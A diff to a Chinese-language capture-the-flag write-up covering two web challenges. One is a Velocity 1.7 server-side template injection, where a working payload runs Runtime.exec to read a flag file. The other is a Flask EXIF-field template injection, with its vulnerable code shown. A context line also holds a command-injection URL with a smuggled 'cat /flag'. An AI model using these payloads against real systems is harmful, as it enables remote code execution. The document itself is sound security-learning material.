@@ -198,6 +198,142 @@ http://94.237.50.221:31205/?format=%H:%M:%S%27;cat%20/flag;echo%20%27
 
 得到flag
 
+
+
+### Labyrinth Linguist 迷宫语言学家
+
+> You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.
+> 你和你的阵营被困在一个迷宫内的避难走廊中，同时被 KORP 变异清除者追击。在计划下一步行动时，你们发现了一个由之前的 Fray 竞争者留下的翻译设备，它用于将英语翻译成伏斯利特语，这是一种由最初建造迷宫的文明所使用的古老语言。众所周知，伏斯利特语也曾是迷宫守护者的语言，他们原本是善良的，但后来被 KORP 设计的一种腐蚀性物质所改变，从而转而对抗人类。你需要逆向工程这个设备，以便与变异体取得联系，并抓住你最后的机会活下来。
+
+代码审计，先判断一下是一个spring 项目,重点在于
+
+```xml
+<dependency>
+    <groupId>org.apache.velocity</groupId>
+    <artifactId>velocity</artifactId>
+    <version>1.7</version>
+</dependency>
+```
+
+查到一个对应版本的
+
+```java
+@RequestMapping("/")
+@ResponseBody
+String index(@RequestParam(required = false, name = "text") String textString) {
+    if (textString == null) {
+        textString = "Example text";
+    }
+
+    String template = "";
+
+    try {
+        template = readFileToString("/app/src/main/resources/templates/index.html", textString);
+    } catch (IOException e) {
+        e.printStackTrace();
+    }
+
+    RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
+    StringReader reader = new StringReader(template);
+
+    org.apache.velocity.Template t = new org.apache.velocity.Template();
+    t.setRuntimeServices(runtimeServices);
+    try {
+        t.setData(runtimeServices.parse(reader, "home"));
+        t.initDocument();
+        VelocityContext context = new VelocityContext();
+        context.put("name", "World");
+
+        StringWriter writer = new StringWriter();
+        t.merge(context, writer);
+        template = writer.toString();
+    } catch (ParseException e) {
+        e.printStackTrace();
+    }
+
+    return template;
+}
+```
+
+使用 Velocity 引擎解析模板：
+
+```java
+RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
+StringReader reader = new StringReader(template);
+t.setData(runtimeServices.parse(reader, "home"));
+```
+
+没有做任何过滤，可以执行语法
+
+https://juejin.cn/post/7246777406386929721
+
+但是具体模板注入语法参考一个外国人博客
+
+https://antgarsil.github.io/posts/velocity/
+
+```
+text=#set ($run=1 + 1) $run 
+```
+
+![image-20250831105644823](https://raw.githubusercontent.com/bx33661/Picgo/main/20250831114832588.png)
+
+执行成功输出2，我们继续命令执行
+
+```java
+#set($x='')##
+#set($str=$x.class.forName("java.lang.String"))##
+#set($chr=$x.class.forName("java.lang.Character"))##
+#set($ex=$x.class.forName("java.lang.Runtime").getRuntime().exec('cat /flag.txt'))##
+$ex.waitFor()
+#set($out=$ex.getInputStream())##
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+```
+
+这个关于这个Java的模板注入后续还得深入学习一下
+
+
+
+
+
+### Guild 公会
+
+> Welcome to the Guild ! But please wait until our Guild Master verify you. Thanks for the wait
+> 欢迎加入公会！但请耐心等待公会大师验证您。感谢您的等待
+
+这道题有点难操作很费时间，但也是ssti，我们分析一下漏洞点
+
+```py
+@views.route("/verify",methods=["GET", "POST"])
+@login_required
+def verify():
+    if current_user.username == "admin":
+        if request.method == "POST":
+            user_id = request.form.get("user_id")
+            verf_id = request.form.get("verification_id")
+            query = Verification.query.filter_by(id=verf_id).first()
+            
+            img = Image.open(query.doc)
+
+            exif_table={}
+
+            for k, v in img.getexif().items():
+                tag = TAGS.get(k)
+                exif_table[tag]=v
+
+            if "Artist" in exif_table.keys():
+                sec_code = exif_table["Artist"]
+                query.verified = 1
+                db.session.commit()
+                return render_template_string("Verified! {}".format(sec_code))
+            else:
+                return render_template_string("Not Verified! :(")
+    else:
+        flash("Oops", category="error")
+        return redirect(url_for("views.home"))
+```
+
+`sec_code` 这个参数我们可以利用[ExifTool](https://exiftool.org/) 工具来写入，最后实现了一个ssti，不过Payload构造还是很麻烦的
+
 ## ICS
 
 > 在 CTF（Capture The Flag）比赛中，**ICS** 通常指的是 **Industrial Control Systems（工业控制系统）**。这种类型的挑战涉及到模拟和渗透测试工业环境中的系统，特别是那些用于监控和控制工业设备的系统。
